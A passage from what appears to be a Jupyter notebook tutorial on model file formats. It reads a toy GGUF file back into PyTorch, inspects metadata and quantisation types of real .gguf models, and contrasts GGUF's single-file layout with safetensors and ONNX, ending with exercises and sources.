00000060  2e 6e 61 6d 65 08 00 00 00 09 00 00 00 00 00 00  |.name...........|

offset 0..3   magic        : b'GGUF'
offset 4..7   version      : 3
offset 8..15  tensor_count : 2
offset 16..23 kv_count     : 3


### Read it back, and run it

`GGUFReader` parses the whole file: `.fields` is the KV table, `.tensors` the weights. Rebuild the
model from those tensors and confirm it predicts exactly what the in-memory model did. (ggml stores
dimensions reversed, so we reshape each tensor back to its known PyTorch shape.)

In [18]:
r = GGUFReader(str(gguf_path))

print("KV table:", ", ".join(r.fields))

recovered = {t.name: torch.from_numpy(np.array(t.data).astype(np.float32).copy())
                          .reshape(model.state_dict()[t.name].shape)
             for t in r.tensors}

from_gguf = LinearRegression()
from_gguf.load_state_dict(recovered)

print("\nweights recovered from GGUF:", dict(from_gguf.state_dict()))
print(f"prediction for 5.0 hours of sunshine: {from_gguf(test_input).item():.4f} jars")
print("identical to the in-memory model:",
      torch.allclose(from_gguf(test_input), model(test_input)))

KV table: GGUF.version, GGUF.tensor_count, GGUF.kv_count, general.architecture, general.name, general.description

weights recovered from GGUF: {'linear.weight': tensor([[1.7551]]), 'linear.bias': tensor([0.7199])}
prediction for 5.0 hours of sunshine: 9.4955 jars
identical to the in-memory model: True


That is the whole idea of the format, at 1/3-billionth of the scale. `llama.cpp` does exactly this —
read the KV table to learn the architecture, memory-map the tensor data, build the compute graph —
and, unlike our two-tensor toy, dequantises `q4_k` blocks on the fly inside the matmul kernel.

## 10. Reading a real model file

The same `GGUFReader` reads any `.gguf`. Point it at a real quantised model and it reproduces the
`llama.cpp` banner this notebook opened with — architecture, tokenizer, vocabulary, and all. Set
`GGUF_PATH` in your environment, or drop a `.gguf` next to this notebook.

In [19]:
def find_gguf():
    env = os.environ.get("GGUF_PATH")
    if env and Path(env).exists():
        return Path(env)
    ours = (WORK / "nulltella.gguf").resolve()
    roots = [Path.home() / "models", Path.home() / ".cache" / "huggingface",
             Path.home() / ".cache" / "lm-studio", Path.home() / "Downloads", Path.cwd()]
    for root in roots:
        if not root.exists():
            continue
        try:
            for p in sorted(root.rglob("*.gguf")):
                if p.resolve() != ours:       # skip the toy file we wrote in section 9
                    return p
        except (PermissionError, OSError):
            continue
    return None


real = find_gguf()
if real is None:
    print("No .gguf found. Grab a small one, e.g.:\n")
    print("  huggingface-cli download TheBloke/TinyLlama-1.1B-Chat-v1.0-GGUF \\")
    print("      tinyllama-1.1b-chat-v1.0.Q4_K_M.gguf --local-dir .\n")
    print("or set GGUF_PATH=/path/to/model.gguf and re-run this cell.")
else:
    print("using:", real.name, f"({real.stat().st_size / 1e9:.2f} GB)")

No .gguf found. Grab a small one, e.g.:

  huggingface-cli download TheBloke/TinyLlama-1.1B-Chat-v1.0-GGUF \
      tinyllama-1.1b-chat-v1.0.Q4_K_M.gguf --local-dir .

or set GGUF_PATH=/path/to/model.gguf and re-run this cell.


In [ ]:
if real is not None:
    rr = GGUFReader(str(real))
    print(f"{real.name}: {len(rr.fields)} KV pairs, {len(rr.tensors)} tensors\n")

    keys = ["general.architecture", "general.name"]
    keys += [k for k in rr.fields if k.endswith(("context_length", "embedding_length", "block_count"))]
    keys += [k for k in rr.fields if k.startswith("tokenizer.ggml.") and k.split(".")[-1] in ("model", "pre")]
    for key in keys:
        f = rr.get_field(key)
        if f is not None:
            try: val = f.contents()
            except Exception: val = "<array>"
            print(f"   {key:<28} {str(val)[:48]}")

    toks = rr.get_field("tokenizer.ggml.tokens")
    if toks is not None:
        print(f"   {'tokenizer.ggml.tokens':<28} {len(toks.data):,} tokens  ← the vocabulary, in the file")

In [ ]:
if real is not None:
    from collections import Counter
    by_type, params, nbytes = Counter(), Counter(), Counter()
    for t in rr.tensors:
        ty = t.tensor_type.name
        by_type[ty] += 1
        params[ty]  += int(t.n_elements)
        nbytes[ty]  += int(t.n_bytes)

    total_p, total_b = sum(params.values()), sum(nbytes.values())
    print(f"{'type':<9}{'tensors':>8}{'params':>17}{'bytes':>19}{'bpw':>8}")
    for ty in sorted(by_type, key=lambda k: -nbytes[k]):
        print(f"{ty:<9}{by_type[ty]:>8}{params[ty]:>17,}{nbytes[ty]:>19,}{nbytes[ty]*8/params[ty]:>8.2f}")

    print(f"\nmodel params : {total_p / 1e9:.2f} B")
    print(f"tensor bytes : {total_b / 2**30:.2f} GiB")
    print(f"overall      : {total_b * 8 / total_p:.2f} bits per weight")
    rr.close()

Those last three lines are the `llm_load_print_meta: model size = 7.17 GiB (8.50 BPW)` line from the
log we started with — recomputed from the raw bytes, this time by the `gguf` library rather than a
parser we hand-rolled.

Notice the mixed types: real quantised models are **not** uniformly quantised. `llama.cpp` keeps
norms and often the embedding/output matrices at higher precision, because those tensors are small
but error-sensitive, and quantises the big attention/FFN matrices hard. That is what "`Q4_K_M`" means
— a *recipe* over per-tensor type choices, not one number.

### Close-up: a GGUF holds the whole model

The safetensors close-up ended with a scattering problem — weights in one file, everything else in
siblings. GGUF is the fix, and its close-up answers the same three questions with one word: *inside*.

**What's in a GGUF** — the same three parts as any binary format, but the header does far more:

- **magic + version** — `GGUF`, then the format version;
- **the KV table** — a typed key→value map that carries *all three* legs of the ML triple;
- **the tensor section** — the weight tensors, usually quantized, memory-mapped on load.

**Where are the tokenizer and vocabulary?** *In the file*, as entries in the KV table. Look back at
the log this notebook opened with:

- `general.architecture = llama`, `llama.context_length = 32768` — the **architecture**;
- `tokenizer.ggml.model`, merges, scores — the **tokenizer**;
- `kv 13: tokenizer.ggml.tokens arr[str,32000]` — the **vocabulary**, all 32,000 tokens, sitting in
  the same file as the weights.

No `config.json`, no `tokenizer.json`, no `vocab.json` beside it. One file.

**How it all fits together to run a model** — `llama.cpp` needs nothing but the `.gguf`:

1. read the **KV table** → learn the architecture, build the empty compute graph;
2. read the **tokenizer + vocabulary** from the KV table → turn text into ids and back;
3. memory-map the **tensor section** → weights, matched to the graph by name;
4. forward → logits → sample → detokenize, and repeat — all from one file.

| To run gpt2 from safetensors | To run a model from GGUF |
|---|---|
| `model.safetensors` — weights | **one `.gguf`**, holding: |
| `config.json` — architecture | · architecture *(KV table)* |
| `tokenizer.json` — tokenizer | · tokenizer *(KV table)* |
| `vocab.json` + `merges.txt` — vocabulary | · vocabulary *(KV table)* |
| `generation_config.json` — decoding | · weights *(tensor section)* |
| **6 files, must travel together** | **1 file — `scp` it and go** |

That single-file self-containment — architecture, tokenizer, vocabulary, and weights in one typed,
extensible table — is the entire reason GGUF exists.


## 11. ONNX: the model as a *program*

Every format so far stores the model as **data** — a bag of named weight tensors plus enough metadata
to find them. *What to compute* with those weights lives elsewhere: in Python (`transformers` builds
the graph from `config.json`) or hardcoded in a runtime (`llama.cpp` has one compute graph per
architecture). Hand someone a `.safetensors` or a `.gguf` and they still need the architecture.

**ONNX inverts this.** The file *is* the computation graph — a DAG of **operators**:

- **nodes** are ops — `MatMul`, `Add`, `Gelu`, `Softmax`, `LayerNormalization`, …;
- **edges** are the tensors flowing between them;
- the weights ride along as **initializers** attached to the graph.

An ONNX file says not just *here are the numbers* but *here is the sequence of operations that turns an
input into an output*. Any ONNX runtime executes it **without knowing the architecture in advance** —
it just walks the graph. Our Nutella model would be a single node:

```text
graph(sunshine):
    jars = Gemm(sunshine, linear.weight, linear.bias)   # one operator, weights as initializers
    return jars
```

| | GGUF / safetensors | ONNX |
|---|---|---|
| The file stores | **data** — weights + metadata | **a program** — the operator graph + weights |
| The compute graph | external (framework or runtime) | **inside the file** |
| To run it you need | the matching architecture code | only an ONNX runtime |
| Wins at | LLM serving — one file, quantized | cross-framework / cross-hardware portability |

That is the fundamental split: safetensors and GGUF are **data a runtime knows how to use**; ONNX is
**a program a runtime executes**. It is why ONNX carries a model between PyTorch, TensorFlow, mobile
NPUs and browser WASM — the graph travels — and also why it is heavier and rarer for pure LLM serving,
where a single quantized GGUF plus a fixed `llama.cpp` graph win on simplicity.


## 12. Where we ended up

We started with a log full of key-value pairs and walked the whole path:

- a model is **code + a `state_dict`**, and only the second half gets serialized;
- `pickle` serializes by emitting a *program*, which is why it is fast to adopt and unsafe to trust;
- `safetensors` fixes safety and zero-copy reads, but stores only tensors + a flat string map —
  the architecture lives in sibling files;
- **checkpoints** add training state that inference never needs;
- **GGML** put everything in one file for on-edge inference, but froze the hyperparameters into a
  positional list and broke on every change;
- **GGUF** keeps the single-file layout and swaps that list for a **typed key-value table**, which is
  the entire reason it survived.

## Exercises

1. **Write it at f16.** Re-run the §9 writer adding each tensor as `float16`
   (`t.detach().numpy().astype(np.float16)`) and confirm the file shrinks while the reader still
   reconstructs a working model.

2. **Diff against someone else's tool.** The `gguf` package ships `gguf_dump.py`. Run it on your
   `nulltella.gguf` and check its key–value table matches what §9 printed — your file, read by a tool
   you didn't write, is the whole point of a spec'd format.

3. **Round-trip a real model.** Take a HuggingFace `safetensors` model, convert it with
   `llama.cpp/convert_hf_to_gguf.py`, and diff the KV table against the source `config.json`.
   Which config fields survive, which are renamed, and which are dropped? What does that tell you
   about what an *inference* format considers essential?

## Sources

- Vicki Boykis, [*GGUF, the long way around*](https://vickiboykis.com/2024/02/28/gguf-the-long-way-around/) (2024) — the essay this notebook rebuilds
- [GGUF specification](https://github.com/ggerganov/ggml/blob/master/docs/gguf.md), `ggerganov/ggml`
- [safetensors format](https://github.com/huggingface/safetensors#yet-another-format-), HuggingFace
- [safetensors security audit](https://huggingface.co/blog/safetensors-security-audit), HuggingFace / Trail of Bits / EleutherAI
- Ned Batchelder, [*Pickle's nine flaws*](https://nedbatchelder.com/blog/202006/pickles_nine_flaws.html)
- Nelson Elhage, [*Pickles and ML*](https://blog.nelhage.com/post/pickles-and-ml/)
- PyTorch, [Saving and loading models](https://pytorch.org/tutorials/beginner/saving_loading_models.html)
